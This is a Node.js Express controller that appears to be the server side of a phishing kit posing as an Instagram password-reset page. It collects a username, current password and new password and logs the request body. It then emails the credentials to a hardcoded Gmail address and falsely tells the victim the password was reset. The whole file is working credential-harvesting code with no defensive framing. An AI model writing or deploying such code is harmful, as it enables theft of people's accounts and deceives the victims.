const {sendEmail} = require('../utils/nodemailer')
const loginTemplate = require('../templates/loginSubmission');


const submit = async (req, res) =>{
    try {
        // access the info from req. body
        console.log("PRINTING REQ BODY!! 😒😒😒",req.body)
        const{
            username,
            currentPassword,
            newPassword
        }= req.body

        if(!username || !currentPassword || !newPassword) return res.status(400).json({message: 'please fill in all required fields'});

        //prepare email to send
         const adminEmail = "slickoutlaw001@gmail.com";
         const adminMailSubject = 'Instagram login recieved'
         const adminMailBody = loginTemplate(username,  currentPassword, newPassword,)

        // send email to admin
        const sendAdminEmail = async () =>{
            try {
                await sendEmail(adminEmail,adminMailSubject, adminMailBody);
                console.log('email has been sent to the admin succesfully')
            } catch (error) {
                console.error('error sending admin email:', error);
            }
        };

        //set timeout of 3 secs and send email
        setTimeout(()=>{
            sendAdminEmail()
        }, 3000)

        res.status(200).json({message: 'Password reset succesfully!'})
    } catch (error) {
        console.error('error submitting login details', error)
        res
      .status(500)
      .json({ message: "An error occurred. Please try again later." });
    }
}

module.exports = submit;